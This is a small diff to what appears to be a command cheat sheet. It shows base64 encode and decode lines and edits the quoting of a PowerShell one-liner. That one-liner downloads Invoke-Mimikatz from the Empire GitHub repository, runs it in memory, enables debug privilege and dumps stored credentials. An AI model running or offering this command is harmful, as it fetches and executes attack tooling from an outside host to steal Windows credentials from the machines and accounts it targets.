@@ -9,4 +9,4 @@ $DecodedText
 cat clear.txt | base64 -o encoded.txt
 cat clear.txt | base64 --decode
 
-IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
